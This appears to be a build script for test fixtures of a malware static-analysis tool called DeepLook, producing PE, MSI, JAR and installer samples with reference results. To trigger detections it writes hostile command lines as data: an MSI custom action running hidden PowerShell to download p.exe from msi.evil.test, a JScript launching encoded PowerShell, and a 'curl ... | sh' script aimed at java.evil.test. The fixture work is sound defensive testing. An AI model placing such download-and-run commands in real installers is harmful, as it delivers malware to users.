# PEs de teste da analise estatica (item 7.1), gerados por ferramentas reais: mingw-w64,
# windres, mcs (Mono), upx e osslsigncode. O pefile e o dnfile, referencias de mercado
# (o imphash e o Rich hash do VirusTotal sao os do pefile), gravam o gabarito em
# reference.json; os testes conferem a analise do DeepLook contra ele.
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y -qq --no-install-recommends gcc-mingw-w64-x86-64 gcc-mingw-w64-i686 \
  binutils-mingw-w64-x86-64 binutils-mingw-w64-i686 mingw-w64-x86-64-dev mingw-w64-i686-dev \
  osslsigncode upx-ucl mono-mcs python3-pefile python3-pip openssl nsis binutils curl libpython3.13 \
  msitools gcab default-jdk-headless \
  ca-certificates >/dev/null
pip install --quiet --break-system-packages dnfile==0.15.1 pyinstaller==6.22.3 \
  autoit-ripper==1.2.0 >/dev/null
W=/work
rm -rf "$W" && mkdir -p "$W" && cp /f/pe/* "$W" && cd "$W"

X64=x86_64-w64-mingw32
X86=i686-w64-mingw32
printf 'int main(void){return 0;}\n' > tiny.c
$X64-gcc -O1 -s -o payload.bin tiny.c
$X64-dlltool -d ws2ord.def -l libws2ord.a
$X64-windres res.rc -O coff -o res64.o
$X64-gcc -O1 -s -o prog64.exe prog.c res64.o -L. -lws2ord -lwininet
$X86-gcc -O1 -s -o prog32.exe prog.c -lws2_32 -lwininet
$X64-gcc -O1 -s -shared -o teste.dll lib.c lib.def
# Analise de funcoes (item 7.2): strings montadas na pilha e decifradas por XOR, para o FLOSS, e
# um ELF de verdade para o capa.
# Emulacao (plans/novas-analises, item 4): o comportamento que o Speakeasy deve ver.
$X86-gcc -O1 -s -o emulado32.exe emulado.c -lwininet
$X64-gcc -O1 -s -o ofuscado64.exe ofuscado.c
$X86-gcc -O1 -s -o ofuscado32.exe ofuscado.c
cp /usr/bin/true linux.elf

# Desempacotar e extrair (item 7.8): instalador NSIS com o prog64.exe dentro, um programa PyInstaller
# (Linux; o formato do arquivo e o mesmo do Windows) e os instaladores oficiais do Inno Setup 6.2.2
# (o innoextract 1.9 le) e 6.4.3 (nao le), conferidos pelo SHA-256 publicado.
cat > instalador.nsi <<NSI
OutFile "nsis.exe"
InstallDir "\$TEMP\\deeplook"
Section
SetOutPath "\$INSTDIR"
File /oname=carga.exe prog64.exe
File /oname=leia.txt lib.c
SectionEnd
NSI
makensis -V1 instalador.nsi
printf 'import sys\nprint("http://pyinst.evil.test/c2")\nsys.exit(0)\n' > painel.py
pyinstaller --onefile --log-level ERROR --distpath . --workpath /tmp/pyi --specpath /tmp/pyi \
  --name pyinst.bin painel.py
for v in 6.2.2:8117d10d00a2ad33a1390978ea3872861c330e087914410a6377b22c4c5b8563 \
  6.4.3:f3c42116542c4cc57263c5ba6c4feabfc49fe771f2f98a79d2f7628b8762723b; do
  ver=${v%%:*} sum=${v#*:}
  curl -sSLf -o "inno-$ver.exe" \
    "https://github.com/jrsoftware/issrc/releases/download/is-$(echo "$ver" | tr . _)/innosetup-$ver.exe"
  echo "$sum  inno-$ver.exe" | sha256sum -c --quiet
done
# AutoIt (plans/caca-e-formatos, item 5): o recurso SCRIPT de um executavel EA06, com o script
# tokenizado e comprimido como o do Aut2Exe (autoit.py), e a mesma coisa dentro de UPX (duas geracoes).
python3 autoit.py payload.bin autoit.bin
printf 'SCRIPT RCDATA "autoit.bin"\n' > autoit.rc
$X86-windres autoit.rc -O coff -o autoit.o
$X86-gcc -O1 -s -o autoit.exe tiny.c autoit.o
# Com o recurso cifrado, o executavel minimo nao comprime o bastante para o upx: o com UPX leva uma
# tabela de 64 KB que comprime (como o interpretador AutoIt de verdade, que tem ~1 MB de codigo).
printf 'const char tabela[65536] = "DeepLook";\nint main(void){return tabela[1];}\n' > autoit-big.c
$X86-gcc -O1 -s -o autoit-big.exe autoit-big.c autoit.o
upx -q --best -o autoit-upx.exe autoit-big.exe >/dev/null
# MSI (plans/caca-e-formatos, item 4): pelo msibuild (msitools), com as tabelas em IDT: uma DLL e
# um JScript na tabela Binary, um VBScript embutido na acao, um EXE com linha de comando como SYSTEM
# e um CAB como midia.
mkdir -p msi/Binary && cp teste.dll msi/Binary/acao.dll
printf 'var s = new ActiveXObject("WScript.Shell");\ns.Run("powershell -enc SQBFAFgA");\n' > msi/Binary/script.js
printf 'Property\tValue\ns72\tl0\nProperty\tProperty\nProductName\tAtualizador Teste\nManufacturer\tFornecedor Teste\nProductVersion\t1.2.3\nProductCode\t{11111111-2222-3333-4444-555555555555}\n' > msi/Property.idt
printf 'Name\tData\ns72\tv0\nBinary\tName\nAcaoDll\tacao.dll\nScriptJs\tscript.js\n' > msi/Binary.idt
printf 'Action\tType\tSource\tTarget\ns72\ti2\tS72\tS255\nCustomAction\tAction\nRodaDll\t1\tAcaoDll\tDllMain\nRodaJs\t5\tScriptJs\t\nInline\t38\t\tCreateObject("WScript.Shell").Run "cmd /c calc"\nBaixa\t3106\tTARGETDIR\tpowershell -w hidden -c iwr http://msi.evil.test/p.exe -o p.exe\nSetProp\t51\tFOO\tbar\n' > msi/CustomAction.idt
(
  cd msi
  msibuild teste.msi -s 'Teste' 'DeepLook' ';1033' '{AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE}'
  msibuild teste.msi -i Property.idt
  msibuild teste.msi -i Binary.idt
  msibuild teste.msi -i CustomAction.idt
  printf 'arquivo dentro do cab\n' > leia.txt
  gcab -c -z midia.cab leia.txt
  msibuild teste.msi -a midia.cab midia.cab
)
cp msi/teste.msi teste.msi
mcs -nologo -out:dotnet.exe hello.cs
mcs -nologo -out:dotnet-loader.exe -resource:prog32.exe,carga.bin carregador.cs
upx -q --best -o upx64.exe prog64.exe >/dev/null
upx -q --best -o upx32.exe prog32.exe >/dev/null
upx -q --best -o upx-dll.dll teste.dll >/dev/null

# Java: um JAR com comportamento de risco e arquivos embutidos (PE, ELF, ZIP e script), um JAR limpo
# e um .class solto. Compilados pelo javac real (bytecode da versao 11).
mkdir -p jar/out/recursos jar/limpo
javac --release 11 -nowarn -d jar/out Principal.java
javac --release 11 -nowarn -d jar/limpo Limpo.java
cp payload.bin jar/out/recursos/carga.exe
cp linux.elf jar/out/recursos/ajuda.bin
python3 -c "import zipfile; z = zipfile.ZipFile('jar/out/recursos/pacote.zip', 'w'); z.writestr('leia.txt', 'oi'); z.close()"
printf '#!/bin/sh\ncurl -s http://java.evil.test/x | sh\n' > jar/out/recursos/instala.sh
printf 'Manifest-Version: 1.0\nMain-Class: demo.Principal\nPremain-Class: demo.Principal\nCreated-By: DeepLook Teste\n' > jar/manifesto.txt
jar --create --file malvado.jar --manifest jar/manifesto.txt -C jar/out .
printf 'Main-Class: demo.Limpo\n' > jar/limpo.txt
jar --create --file limpo.jar --manifest jar/limpo.txt -C jar/limpo .
cp jar/limpo/demo/Limpo.class solto.class

# Assinatura: AC propria e certificado de assinatura de codigo; e um autoassinado.
openssl req -x509 -newkey rsa:2048 -nodes -days 3650 -subj '/CN=DeepLook Teste AC/O=DeepLook' \
  -keyout ca.key -out ca.pem -addext 'basicConstraints=critical,CA:TRUE' 2>/dev/null
openssl req -newkey rsa:2048 -nodes -subj '/CN=Fornecedor Teste Ltda/O=Fornecedor Teste' \
  -keyout leaf.key -out leaf.csr 2>/dev/null
printf 'extendedKeyUsage=codeSigning\nbasicConstraints=CA:FALSE\n' > leaf.ext
openssl x509 -req -in leaf.csr -CA ca.pem -CAkey ca.key -CAcreateserial -days 3650 \
  -extfile leaf.ext -out leaf.pem 2>/dev/null
cat leaf.pem ca.pem > chain.pem
# Carimbo de tempo do TSA embutido no osslsigncode, com data fixa (2026-01-01 00:00 UTC).
openssl req -newkey rsa:2048 -nodes -subj '/CN=DeepLook Teste TSA' -keyout tsa.key \
  -out tsa.csr 2>/dev/null
printf 'extendedKeyUsage=critical,timeStamping\nbasicConstraints=CA:FALSE\n' > tsa.ext
openssl x509 -req -in tsa.csr -CA ca.pem -CAkey ca.key -CAcreateserial -days 3650 \
  -extfile tsa.ext -out tsa.pem 2>/dev/null
cat tsa.pem ca.pem > tsa-chain.pem
osslsigncode sign -certs chain.pem -key leaf.key -h sha256 -n 'Teste DeepLook' \
  -i https://deeplook.test -TSA-certs tsa-chain.pem -TSA-key tsa.key -TSA-time 1767225600 \
  -in prog64.exe -out assinado.exe >/dev/null
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -days 3650 \
  -subj '/CN=Autoassinado Teste' -addext 'extendedKeyUsage=codeSigning' \
  -keyout self.key -out self.pem 2>/dev/null
osslsigncode sign -certs self.pem -key self.key -h sha256 -in prog32.exe \
  -out autoassinado.exe >/dev/null

python3 post.py "$W"
python3 reference.py "$W" > reference.json
mkdir -p /out
cp prog64.exe prog32.exe teste.dll dotnet.exe upx64.exe upx32.exe upx-disfarcado.exe rich.exe \
  rich-forjado.exe checksum-ok.exe checksum-errado.exe overlay.exe assinado.exe adulterado.exe \
  autoassinado.exe upx-dll.dll ofuscado64.exe ofuscado32.exe emulado32.exe linux.elf nsis.exe \
  pyinst.bin autoit.exe autoit-upx.exe payload.bin teste.msi dotnet-loader.exe \
  inno-6.2.2.exe inno-6.4.3.exe malvado.jar limpo.jar solto.class reference.json /out/
# Arquivos com o dono de quem roda os testes (senao o proximo rm do runner falha).
if [ -n "$OWNER" ]; then chown -R "$OWNER" /out; fi
echo "pe ok"
